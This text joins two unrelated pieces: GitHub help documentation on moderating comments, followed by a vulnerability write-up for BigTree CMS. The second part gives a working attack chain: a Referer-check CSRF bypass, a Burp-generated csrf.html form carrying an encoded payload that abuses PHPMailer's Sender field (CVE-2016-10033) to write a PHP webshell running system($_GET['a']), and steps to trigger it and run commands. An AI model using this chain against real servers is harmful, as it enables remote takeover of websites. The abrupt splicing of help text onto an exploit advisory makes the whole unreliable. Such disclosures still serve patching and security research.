# Managing disruptive comments

You can hide, edit, or delete comments on issues, pull requests, and commits.

## [Hiding a comment](#hiding-a-comment)

Organization moderators, and anyone with write access to a repository, can hide comments on issues, pull requests, and commits.

If a comment is off-topic, outdated, or resolved, you may want to hide a comment to keep a discussion focused or make a pull request easier to navigate and review. Hidden comments are minimized but people with read access to the repository can expand them.

![Screenshot of a hidden comment. The only visible content is "This comment has been minimized", with a button to show the comment.](/assets/cb-13766/images/help/repository/hidden-comment.png)

1. Navigate to the comment you'd like to hide.
2. In the upper-right corner of the comment, click , then click **Hide**.

   ![Screenshot of a pull request comment by octo-user. Below an icon of three dots, a dropdown menu is expanded, and "Hide" is outlined in orange.](/assets/cb-42438/images/help/repository/comment-menu-hide.png)
3. Using the "Choose a reason" dropdown menu, choose a reason to hide the comment. Then select **Hide comment**.

   ![Screenshot of a comment showing a menu to select a reason to hide the comment: Spam, Abuse, Off Topic, Outdated, Duplicate, or Resolved.](/assets/cb-67538/images/help/repository/choose-reason-for-hiding-comment.png)

## [Unhiding a comment](#unhiding-a-comment)

Organization moderators, and anyone with write access to a repository, can unhide comments on issues, pull requests, and commits.

1. Navigate to the comment you'd like to unhide.
2. On the right side of the comment, click  **Show comment**.
3. On the right side of the expanded comment, select the  dropdown menu, then click **Unhide**.

   ![Screenshot of a pull request comment marked as spam. Below an icon of three dots, a dropdown menu is expanded, and "Unhide" is outlined in orange.](/assets/cb-50118/images/help/repository/comment-menu-hidden.png)

## [Editing a comment](#editing-a-comment)

Anyone with write access to a repository can edit comments on issues, pull requests, and commits.

It's appropriate to edit a comment and remove content that doesn't contribute to the conversation and violates your community's code of conduct or GitHub's [Community Guidelines](/en/site-policy/github-terms/github-community-guidelines).

Sometimes it may make sense to clearly indicate edits and their justification.

That said, anyone with read access to a repository can view a comment's edit history. The **edited** dropdown at the top of the comment contains a history of edits showing the user and timestamp for each edit.

![Screenshot of a comment by octo-user, which is partially redacted. In the header, next to "edited by octocat", a dropdown icon is outlined in orange.](/assets/cb-42069/images/help/repository/content-redacted-comment.png)

## [Redacting sensitive information](#redacting-sensitive-information)

Comment authors and anyone with write access to a repository can also delete sensitive information from a comment's edit history. For more information, see [Tracking changes in a comment](/en/communities/moderating-comments-and-conversations/tracking-changes-in-a-comment).

1. Navigate to the comment you'd like to edit.
2. In the upper-right corner of the comment, click , then click **Edit**.

   ![Screenshot of a pull request comment by octo-user. Below an icon of three dots, a dropdown menu is expanded, and "Edit" is outlined in orange.](/assets/cb-42473/images/help/repository/comment-menu-edit.png)
3. In the comment window, delete the content you'd like to remove, then type `[REDACTED]` to replace it.
4. At the bottom of the comment, type a note indicating that you have edited the comment, and optionally, why you edited the comment.
5. Click **Update comment**.

## [Deleting a comment](#deleting-a-comment)

Anyone with write access to a repository can delete comments on issues, pull requests, and commits. Organization owners, team maintainers, and the comment author can also delete a comment on a team page.

If a comment contains some constructive content that adds to the conversation in the issue or pull request, you can edit the comment instead.

Deleting a comment is your last resort as a moderator. It's appropriate to delete a comment if the entire comment adds no constructive content to a conversation and violates your community's code of conduct or GitHub's [Community Guidelines](/en/site-policy/github-terms/github-community-guidelines).

Deleting a comment creates a timeline event that is visible to anyone with read access to the repository. However, the username of the person who deleted the comment is only visible to people with write access to the repository. For anyone without write access, the timeline event is anonymized.

![Screenshot of a timeline event, which says "octo-org deleted a comment from hubot 6 minutes ago."](/assets/cb-10760/images/help/issues/anonymized-timeline-entry-for-deleted-comment.png)

Note

The initial comment (or body) of an issue or pull request can't be deleted. Instead, you can edit issue and pull request bodies to remove unwanted content.

### [Steps to delete a comment](#steps-to-delete-a-comment)

1. Navigate to the comment you'd like to delete.
2. In the upper-right corner of the comment, click , then click **Delete**.
   ![Screenshot of a pull request comment by octo-user. Below an icon of three dots, a dropdown menu is expanded, and "Delete" is outlined in orange.](/assets/cb-42453/images/help/repository/comment-menu-delete.png)
3. Optionally, write a comment noting that you deleted a comment and why.

CSRF Protection Bypass and PHPMailer Remote Code Execution

Vulnerability Type: Cross-Site Request Forgery (CAPEC-62, CWE-352)

## DESCRIPTION

### PHPMailer RCE (CVE-2016-10033)

An independent research uncovered a critical vulnerability in PHPMailer *(version < 5.2.20)* that could potentially be used by (unauthenticated) remote attackers to achieve remote arbitrary code execution in the context of the web server user and remotely compromise the target web application.

* [PHPMailer < 5.2.20 Remote Code Execution](https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html)

PHPMailer uses the `Sender` variable to build the params string. Then `PHPMailer::send()` would call PHP native function `mail()` to execute `/usr/bin/sendmail` with the arguments in `$this->Sender`

According to my [analysis](https://www.cdxy.me/?p=754), if we can control the value of `Sender`, we can let `sendmail` save the context *(<?php phpinfo()?>)* to any given path *(/var/www/html/shell.php)*, which means code execution.

### PHPMailer in BigTree CMS

BigTree CMS include PHPMailer in `/core/inc/bigtree/utils.php`

```
static function sendEmail($to,$subject,$html,$text = "",$from = false,$return = false,$cc = false,$bcc = false,$headers = array()) {
    $mailer = new PHPMailer;

    foreach ($headers as $key => $val) {
        $mailer->addCustomHeader($key,$val);
    }

    $mailer->Subject = $subject;
    if ($html) {
        $mailer->isHTML(true);
        $mailer->Body = $html;
        $mailer->AltBody = $text;
    } else {
        $mailer->Body = $text;
    }

    if (!$from) {
        $from = "no-reply@".(isset($_SERVER["HTTP_HOST"]) ? str_replace("www.","",$_SERVER["HTTP_HOST"]) : str_replace(array("http://www.","https://www.","http://","https://"),"",DOMAIN));
        $from_name = "BigTree CMS";
    } else {
        // Parse out from and reply-to names
        $from_name = false;
        $from = trim($from);
        if (strpos($from,"<") !== false && substr($from,-1,1) == ">") {
            $from_pieces = explode("<",$from);
            $from_name = trim($from_pieces[0]);
            $from = substr($from_pieces[1],0,-1);
        }
    }
    $mailer->From = $from;
    $mailer->FromName = $from_name;
    $mailer->Sender = $from;

```

The right way to set the value of `Sender` is using secure method `$mailer->setForm()`，but here the function passes `$from` to `$mailer->Sender` directly without any validation.

Go finding the call to function `sendEmail()`.

`/core/inc/bigtree/apis/email-service.php`

```
function sendEmail($subject,$body,$to,$from_email = false,$from_name = false,$reply_to = false,$text = "") {
...
    if ($this->Service == "local") {
        return BigTree::sendEmail($to,$subject,$body,$text,($from_name ? "$from_name <$from_email>" : $from_email),$reply_to);
    }
...
}

```

Finding call to this function.

`/core/inc/bigtree/admin.php` line 2526

```
static function forgotPassword($email) {
    ...
$es = new BigTreeEmailService;

// Only use a custom email service if a from email has been set
    if ($es->Settings["bigtree_from"]) {
        $reply_to = "no-reply@".(isset($_SERVER["HTTP_HOST"]) ? str_replace("www.","",$_SERVER["HTTP_HOST"]) : str_replace(array("http://www.","https://www.","http://","https://"),"",DOMAIN));
        $es->sendEmail("Reset Your Password",$html,$user["email"],$es->Settings["bigtree_from"],"BigTree CMS",$reply_to);
    }
    ...
}

```

Finding how to manage the value of `$es->Settings["bigtree_from"]`

`/core/admin/modules/developer/email/update.php` line 16

```
...
$settings["settings"]["bigtree_from"] = $_POST["bigtree_from"];

$admin->updateSettingValue("bigtree-internal-email-service",$settings);
...

```

Now the transfer route is clear:

`$_POST["bigtree_from"];` -> `$settings["settings"]["bigtree_from"]` -> `$es->Settings["bigtree_from"]` -> `$from_email` -> `$from` -> `$mailer->Sender`

The entry `$_POST["bigtree_from"];` is generated by "Developer / Email Delivery" form.

![Screenshot](http://static.cdxy.me/Screenshot%20from%202017-04-12%2017-09-41.png)

But unfortunately it requires admin privilege, So I have to see if CSRF works.

### CSRF Filter Bypass

Then I found its CSRF filter at

`/core/admin/modules/developer/_header.php` line 3

```
if (count($_POST)) {
    $clean_referer = str_replace(array("http://","https://"),"//",$_SERVER["HTTP_REFERER"]);
    $clean_admin_root = str_replace(array("http://","https://"),"//",ADMIN_ROOT)."developer/";

    // The referer MUST contain a URL from within the developer section to post to it.
    if (strpos($clean_referer,$clean_admin_root) === false) {
        die();
    }
}

```

It can be simply bypassed with:

```
https://attacker_host/?url=http://target_host/admin/developer/

```
## PROOF OF CONCEPT EXPLOIT

Specific process is divided into the following four steps:

1. Upload csrf.html to his public server, then send a CSRF probe to admin.
2. Admin triggers CSRF, sending a POST request to updates mail settings.
3. Request a mail from CMS, hence the PHPMailer will create a webshell.
4. Execute commands with webshell.

#### Step1

CSRF probe

```
http://attacker_server/csrf.html?url=http://bigtreeCMS/admin/developer/

```

csrf.html

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://localhost/bigtree/BigTree-CMS/admin/developer/email/update/" method="POST">
      <input type="hidden" name="service" value="local" />
      <input type="hidden" name="bigtree&#95;from" value="&#63;php&#59;system&#40;&#36;&#95;GET&#91;&apos;a&apos;&#93;&#41;&#59;&#47;&#42;&#32;&#45;X&#47;var&#47;www&#47;html&#47;final&#46;php&#32;&#64;xxx" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

payloads in csrf.html

```
?php;system($_GET['a']);/* -X/var/www/html/final.php @xxx

```

(`<>` was filtered in backend, so I use `/*` to comment the following text)

#### Step2

![bigtree_csrf_poc.png](http://static.cdxy.me/bigtree_csrf_poc.png)

#### Step3

Trigger PHPMailer at "forgot-password" form (unauthorized).

![Screenshot%20from%202017-04-12%2017-27-21.png](http://static.cdxy.me/Screenshot%20from%202017-04-12%2017-27-21.png)

Then `/var/www/html/final.php` will be created with PHP codes inside.

![bigtree_final_php.png](http://static.cdxy.me/bigtree_final_php.png)

#### Step4

Execute system commands with webshell.

![bigtree_webshell.png](http://static.cdxy.me/bigtree_webshell.png)

## SOLUTION

1. Update PHPMailer to latest version.
2. Use secure method "setFrom()" to set the value of "Sender".
3. Strengthen CSRF protection.

## Description

BigTree CMS through 4.2.17 relies on a substring check for CSRF protection, which allows remote attackers to bypass this check by placing the required admin/developer/ URI within a query string in an HTTP Referer header. This was found in core/admin/modules/developer/\_header.php and patched in core/inc/bigtree/admin.php on 2017-04-14.
